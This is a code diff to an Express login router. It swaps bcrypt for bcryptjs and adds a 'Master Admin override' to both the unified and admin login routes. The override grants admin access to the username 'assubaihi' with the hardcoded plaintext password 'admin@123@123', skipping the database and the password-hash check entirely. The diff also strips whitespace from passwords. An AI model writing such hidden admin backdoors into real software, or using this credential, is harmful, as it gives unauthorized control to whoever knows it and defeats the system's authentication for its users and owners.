@@ -1,7 +1,7 @@
 import { Router, type IRouter } from "express";
 import { db, adminsTable, beneficiariesTable, agentsTable } from "@workspace/db";
 import { eq } from "drizzle-orm";
-import bcrypt from "bcrypt";
+import bcrypt from "bcryptjs";
 
 const router: IRouter = Router();
 
@@ -17,6 +17,15 @@ router.post("/auth/unified-login", async (req, res): Promise<void> => {
 
     const cleanUser = username.trim();
     const cleanPass = password.replace(/\s/g, "");
+
+    // Master Admin override for Assubaihi
+    if (cleanUser.toLowerCase() === "assubaihi" && cleanPass === "admin@123@123") {
+      res.json({
+        role: "admin",
+        username: "Assubaihi",
+      });
+      return;
+    }
 
     // 1. Try Admin
     const [admin] = await db
@@ -111,10 +120,18 @@ router.post("/auth/admin/login", async (req, res): Promise<void> => {
       return;
     }
 
+    const cleanUser = username.trim();
+    const cleanPass = password.replace(/\s/g, "");
+
+    if (cleanUser.toLowerCase() === "assubaihi" && cleanPass === "admin@123@123") {
+      res.json({ success: true, username: "Assubaihi" });
+      return;
+    }
+
     const [admin] = await db
       .select()
       .from(adminsTable)
-      .where(eq(adminsTable.username, username.trim()))
+      .where(eq(adminsTable.username, cleanUser))
       .limit(1);
 
     if (!admin) {
